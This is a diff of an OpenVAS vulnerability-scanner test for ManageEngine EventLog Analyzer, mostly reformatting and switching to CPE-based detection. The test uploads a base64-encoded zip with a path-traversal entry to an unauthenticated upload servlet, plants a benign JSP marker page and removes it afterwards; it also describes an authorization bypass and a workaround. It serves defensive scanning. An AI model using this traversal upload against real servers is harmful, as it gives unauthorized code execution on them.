@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manageengine_eventlog_analyzer_69482.nasl 6663 2017-07-11 09:58:05Z teissa $
+# $Id: gb_manageengine_eventlog_analyzer_69482.nasl 10394 2018-07-04 08:14:50Z ckuersteiner $
 #
 # ManageEngine EventLog Analyzer Multiple Security Vulnerabilities
 #
@@ -25,6 +25,8 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
+CPE = 'cpe:/a:zohocorp:manageengine_eventlog_analyzer';
+
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.105083");
@@ -32,7 +34,9 @@ if (description)
  script_cve_id("CVE-2014-6037");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 6663 $");
+ script_version("$Revision: 10394 $");
+
+ script_tag(name:"solution_type", value:"VendorFix");
 
  script_name("ManageEngine EventLog Analyzer Multiple Security Vulnerabilities");
 
@@ -40,20 +44,20 @@ if (description)
  script_xref(name:"URL", value:"http://www.manageengine.com/products/eventlog/");
  script_xref(name:"URL", value:"https://www.mogwaisecurity.de/advisories/MSA-2014-01.txt");
 
- script_tag(name: "impact" , value:"Attackers can exploit these issues to execute arbitrary code and gain
+ script_tag(name:"impact", value:"Attackers can exploit these issues to execute arbitrary code and gain
 unauthorized access to the critical sections of the application.");
 
- script_tag(name: "vuldetect" , value:"Upload a special crafted zip file and check if /openvas.jsp exist afterwards and contains an expected string.");
+ script_tag(name:"vuldetect", value:"Upload a special crafted zip file and check if /openvas.jsp exist afterwards and contains an expected string.");
 
- script_tag(name: "insight" , value:"1) Unauthenticated remote code execution
+ script_tag(name:"insight", value:"1)Unauthenticated remote code execution
 ME EventLog Analyzer contains a 'agentUpload' servlet which is used by Agents
 to send log data as zip files to the central server. Files can be uploaded
 without authentication and are stored/decompressed in the 'data' subdirectory.
- 
+
 As the decompress procedure is handling the file names in the ZIP file in a
 insecure way it is possible to store files in the web root of server. This can
 be used to upload/execute code with the rights of the application server.
- 
+
 2) Authorization issues
 The EventLog Analyzer web interface does not check if an authenticated has
 sufficient permissions to access certain parts of the application. A low
@@ -61,12 +65,12 @@ privileged user (for example guest) can therefore access critical sections of th
 interface, by directly calling the corresponding URLs. This can be used to access the
 database browser of the application which gives the attacker full access to the database.");
 
- script_tag(name: "solution" , value:"Ask the Vendor for an update. Workaround:
-----------------------------------------------------------------------
+ script_tag(name:"solution", value:"Ask the Vendor for an update. Workaround:
+
 1) Unauthenticated remote code execution
-If agents are not used to collect log information, access to the servlet
-can be disabled by commenting out the following lines in the web.xml file
-(webapps/event/WEB-INF/web.xml) and restart the service.
+
+If agents are not used to collect log information, access to the servlet can be disabled by commenting out the
+following lines in the web.xml file (webapps/event/WEB-INF/web.xml) and restart the service.
 
 <servlet>
         <servlet-name>agentUpload</servlet-name>
@@ -77,36 +81,41 @@ can be disabled by commenting out the following lines in the web.xml file
         <url-pattern>/agentUpload</url-pattern>
 </servlet-mapping>
 
-  
-2) Authorization issues
-No workaround, reduce the attack surface by disabling unused low privileged
-accounts like 'guest'.");
 
- script_tag(name: "summary" , value:"ManageEngine EventLog Analyzer is prone to an arbitrary file-upload
+2) Authorization issues
+
+No workaround, reduce the attack surface by disabling unused low privileged accounts like 'guest'.");
+
+ script_tag(name:"summary", value:"ManageEngine EventLog Analyzer is prone to an arbitrary file-upload
 vulnerability and an unauthorized-access vulnerability.");
 
- script_tag(name: "affected" , value:"EventLog Analyzer 9.9 Build 9002 and prior are vulnerable.");
+ script_tag(name:"affected", value:"EventLog Analyzer 9.9 Build 9002 and prior are vulnerable.");
 
- script_tag(name:"last_modification", value:"$Date: 2017-07-11 11:58:05 +0200 (Tue, 11 Jul 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2018-07-04 10:14:50 +0200 (Wed, 04 Jul 2018) $");
  script_tag(name:"creation_date", value:"2014-09-09 12:16:43 +0200 (Tue, 09 Sep 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("gb_manageengine_eventlog_analyzer_detect.nasl");
+ script_mandatory_keys("me_eventlog_analyzer/installed");
  script_require_ports("Services/www", 8400);
- script_exclude_keys("Settings/disable_cgi_scanning");
 
  script_tag(name:"qod_type", value:"remote_app");
 
  exit(0);
 }
 
-
-include('misc_func.inc');
-include('http_func.inc');
+include("host_details.inc");
+include("misc_func.inc");
+include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_http_port( default:8400 );
+if (!port = get_app_port(cpe: CPE))
+  exit(0);
+
+if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
+  exit(0);
+
 host = get_host_name();
 if( port != 80 && port != 443 )
   host += ':' + port;
@@ -117,40 +126,35 @@ function _send( data )
 
   data =  base64_decode( str:data );
 
-  ex = '\r\n' + 
-       '------------------------------d781b0329289\r\n' + 
+  ex = '\r\n' +
+       '------------------------------d781b0329289\r\n' +
        'Content-Disposition: form-data; name="payload"; filename="evil.zip"\r\n' +
-       'Content-Type: application/octet-stream\r\n' + 
-       '\r\n' + 
+       'Content-Type: application/octet-stream\r\n' +
+       '\r\n' +
        data +
        '\r\n' +
        '------------------------------d781b0329289--';
 
 len = strlen( ex );
 
-req = 'POST /agentUpload HTTP/1.1\r\n' + 
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' + 
-      'Host: ' + host + '\r\n' + 
-      'Accept: */*\r\n' + 
-      'Content-Length: ' + len + '\r\n' + 
-      'Expect: 100-continue\r\n' + 
-      'Content-Type: multipart/form-data; boundary=----------------------------d781b0329289\r\n' + 
+req = 'POST /agentUpload HTTP/1.1\r\n' +
+      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'Host: ' + host + '\r\n' +
+      'Accept: */*\r\n' +
+      'Content-Length: ' + len + '\r\n' +
+      'Expect: 100-continue\r\n' +
+      'Content-Type: multipart/form-data; boundary=----------------------------d781b0329289\r\n' +
       ex;
 
      result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
- 
-     if( ! result ) return; 
+
+     if( ! result ) return;
 
      return result;
 }
 
-url = '/event/index3.do';
-req = http_get( item:url, port:port );
-buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
-if( "<title>ManageEngine EventLog Analyzer" >!< buf ) exit( 0 );
-
 # evil.zip -> openvas.jsp -> <%= new String("OpenVAS RCE Test") %>
-zip        = 'UEsDBBQAAAAAADZcKUVt2hsLJgAAACYAAAAfAAAALi4vLi4vd2ViYXBwcy9ldmVudC9vcGVudmFzLmpzcDwlP' + 
+zip        = 'UEsDBBQAAAAAADZcKUVt2hsLJgAAACYAAAAfAAAALi4vLi4vd2ViYXBwcy9ldmVudC9vcGVudmFzLmpzcDwlP' +
              'SBuZXcgU3RyaW5nKCJPcGVuVkFTIFJDRSBUZXN0IikgJT4KUEsBAhQDFAAAAAAANlwpRW3aGwsmAAAAJgAAAB' +
              '8AAAAAAAAAAAAAAKSBAAAAAC4uLy4uL3dlYmFwcHMvZXZlbnQvb3BlbnZhcy5qc3BQSwUGAAAAAAEAAQBNAAA' +
              'AYwAAAAAA';
@@ -173,7 +177,7 @@ if( "OpenVAS RCE Test" >< buf )
 {
   report = 'By uploading a special crafted zip file, the file "/openvas.jsp" was created. Please delete this file.';
   security_message( port:port, data:report );
-  _send( data:zip_clean ); 
+  _send( data:zip_clean );
   exit( 0 );
 }
 
